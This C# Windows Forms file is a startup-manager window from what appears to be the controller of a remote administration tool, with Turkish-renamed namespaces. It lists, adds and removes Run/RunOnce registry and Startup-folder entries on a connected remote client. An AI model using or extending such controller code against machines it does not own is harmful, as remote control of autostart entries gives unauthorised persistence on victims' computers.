using System;
using System.Linq;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;

namespace xServer.Formlar
{
    public partial class FrmBaşlangıçYöneticisi : Form
    {
        private readonly Client _connectClient;

        public FrmBaşlangıçYöneticisi(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmStm = this;
            InitializeComponent();
        }

        private void FrmStartupManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                Text = PencereYardımcısı.GetWindowTitle("Başlangıç Yöneticisi", _connectClient);
                AddGroups();
                new GetStartupItems().Execute(_connectClient);
            }
        }

        private void AddGroups()
        {
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lstStartupItems.Groups.Add(
                new ListViewGroup(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lstStartupItems.Groups.Add(new ListViewGroup("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        }

        private void FrmStartupManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmStm = null;
        }

        public void AddAutostartItemToListview(ListViewItem lvi)
        {
            try
            {
                lstStartupItems.Invoke((MethodInvoker) delegate { lstStartupItems.Items.Add(lvi); });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public ListViewGroup GetGroup(int group)
        {
            ListViewGroup g = null;
            try
            {
                lstStartupItems.Invoke((MethodInvoker) delegate { g = lstStartupItems.Groups[group]; });
            }
            catch (InvalidOperationException)
            {
                return null;
            }
            return g;
        }

        #region "ContextMenuStrip"

        private void addEntryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmBaşlangıcaEkle())
            {
                if (frm.ShowDialog() == DialogResult.OK)
                {
                    if (_connectClient != null)
                    {
                        new DoStartupItemAdd(Başlangıçİtemleri.Name, Başlangıçİtemleri.Path,
                            Başlangıçİtemleri.Type).Execute(_connectClient);
                        lstStartupItems.Items.Clear();
                        new GetStartupItems().Execute(_connectClient);
                    }
                }
            }
        }

        private void removeEntryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int modifiyeli = 0;
            foreach (ListViewItem item in lstStartupItems.SelectedItems)
            {
                if (_connectClient != null)
                {
                    int type = lstStartupItems.Groups.Cast<ListViewGroup>().TakeWhile(t => t != item.Group).Count();
                    new DoStartupItemRemove(item.Text, item.SubItems[1].Text, type).Execute(_connectClient);
                }
                modifiyeli++;
            }

            if (modifiyeli > 0 && _connectClient != null)
            {
                lstStartupItems.Items.Clear();
                new GetStartupItems().Execute(_connectClient);
            }
        }

        #endregion
    }
}